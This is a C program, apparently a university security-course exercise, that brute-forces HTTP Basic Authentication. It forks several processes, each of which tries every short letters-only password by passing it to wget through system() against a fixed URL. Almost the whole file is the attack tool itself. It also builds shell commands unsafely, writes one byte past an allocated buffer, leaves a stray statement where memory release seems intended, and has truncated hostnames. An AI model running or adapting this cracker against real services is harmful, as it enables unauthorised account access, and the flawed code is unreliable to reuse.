


 

#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/wait.h>
#include <signal.h>
#include <sys/signal.h>			  


#define USERNAME ""
#define URL "sec-crack.cs.rmit.edu./SEC/2"
#define TEST_URL "yallara.cs.rmit.edu./~/secure"
#define MAX_PASSWD_LEN 3
#define MAX_CHAR_SET 52
#define NUM_OF_PROCESSES 4

#define TRUE 1
#define FALSE 0










typedef int (*CrackFuncPtr)(const char*, const char*, int);


int pwdFound;
int cDie;


int runBruteForce(const char chSet[], int numOfCh, int len, CrackFuncPtr func
						, int sCh, int eCh, int id);
char* initPasswdStr(int len, char ch, char headOfChSet);
int getChPos(const char chSet[], int numOfCh, char ch);
int pow(int x, int y);
int crackHTTPAuth(const char *username, const char *passwd, int id);
int myFork(const char chSet[], int numOfCh, int len, CrackFuncPtr func
				, int sCh, int eCh);





void passwdFoundHandler(int signum)
{
	pwdFound = TRUE;
}



void childFinishHandler(int signum)
{
	cDie++;	
}





int main()
{
	char charSet[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 
                     'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 
					 'W', 'X', 'Y', 'Z',	
					 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',	
					 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 
					 'w', 'x', 'y', 'z'};
	

	int i;	
	int pid[NUM_OF_PROCESSES];

	pwdFound = FALSE;
	cDie = 0;
	
	for (i=0; i<NUM_OF_PROCESSES; i++)
	{
		pid[i] = myFork(charSet, MAX_CHAR_SET, MAX_PASSWD_LEN, crackHTTPAuth, 
						(((MAX_CHAR_SET /NUM_OF_PROCESSES)*i)+1)-1, 
						(MAX_CHAR_SET /NUM_OF_PROCESSES)*(i+1)-1);
	}

	
	for (;;)
	{
		signal(SIGUSR1, passwdFoundHandler);
		signal(SIGUSR2, childFinishHandler);

		
		if (pwdFound)
		{
			for (i=0; i<4; i++)
			{
				kill((int)pid[i], SIGKILL);
			}
			exit(EXIT_SUCCESS);
		}

		
		if (cDie >= NUM_OF_PROCESSES)
		{
			exit(EXIT_SUCCESS);
		}

	}
	return EXIT_SUCCESS;
}



int myFork(const char chSet[], int numOfCh, int len, CrackFuncPtr func,
				int sCh, int eCh)
{
	int i;
	
	int pid = fork();

	if (pid == 0)
	{
		for (i=1; i<=len; i++)
		{
			if (runBruteForce(chSet, numOfCh, i, func, sCh, eCh, getpid()))
			{	
				
 				if (!kill(getppid(), SIGUSR1))
				{
					printf("Process %d found the password and notified the parent process already", 
									(int)getpid());
				}

				exit(EXIT_SUCCESS);
			}
		}

		
		if (!kill(getppid(), SIGUSR2))
		{
			printf("Process %d could not found the password and notified the parent process already", 
									(int)getpid());
		}
		
		exit(EXIT_SUCCESS);
	}
	else if (pid > 0)
	{
		return pid;
	}
	else
	{
		printf("error\n");
		exit(EXIT_FAILURE);
	}
}



int runBruteForce(const char chSet[], int numOfCh, int len, CrackFuncPtr func
						, int sCh, int eCh, int id)
{
	int iter; 
	int chIter; 
	int curPos = 0; 
	
	char *str;
	
	int passwdFound = FALSE;
	
	str = initPasswdStr(len, chSet[sCh], chSet[0]);

	printf("\nNow trying %d character(s)\n", len);

	for (iter=0; (iter<pow(numOfCh, (len-1))*(eCh-sCh+1))&&(!passwdFound); iter++)
	{
		for (chIter=len-1; chIter>=0; chIter--)
		{
			if (iter % pow(numOfCh, chIter) == 0) 
			{
				curPos = getChPos(chSet, numOfCh, str[chIter]);
				str[chIter] = chSet[curPos+1];
			}

			if (iter % pow(numOfCh, (chIter+1)) == 0) 
			{
				if (chIter == len-1)
				{
					str[chIter] = chSet[sCh];
				}
				else
				{
					str[chIter] = chSet[0];
				}
			}
		}

		if (func(USERNAME, str, id))
		{
			printf("\nPassword found: %s\n\n", str);
			passwdFound = TRUE;
		}			
	}

	(str);
	str = NULL;
	
	return passwdFound;
}



int getChPos(const char chSet[], int numOfCh, char ch)
{
	int i;
	
	for (i=0; i<numOfCh; i++)
	{
		if (chSet[i] == ch)
		{
			return i;
		}
	}

	return -1;
	
}



char* initPasswdStr(int len, char ch, char headOfChSet)
{
	int i;

	char *str;

	str = malloc(len);

	if (str)
	{
		for (i=0; i<len-1; i++)
		{
			str[i] = headOfChSet;
		}
		str[len-1] = ch;
		str[len] = '\0';
	}
	else
	{
		fprintf(stderr, "\nError: Unable  allocate %d bytes memory.", len);
		exit(EXIT_FAILURE);
	}
	
	return str;
}



int pow(int x, int y)
{
	int ans = 1, i;
	
	for (i=0; i<y; i++)
	{
		ans *= x;
	}

	return ans;
}



int crackHTTPAuth(const char *username, const char *passwd, int id)
{
	char cmd[256];
	struct stat fileInfo;
	char fileToCheck[256];
	
	sprintf(cmd, "wget -O %d -q --http-user=%s --http-passwd=%s --proxy=off %s", 
						id, username, passwd, URL);

	system(cmd);	

	sprintf(fileToCheck, "%d", id);

	(void)stat(fileToCheck, &fileInfo); 
	return fileInfo.st_size;
	
}


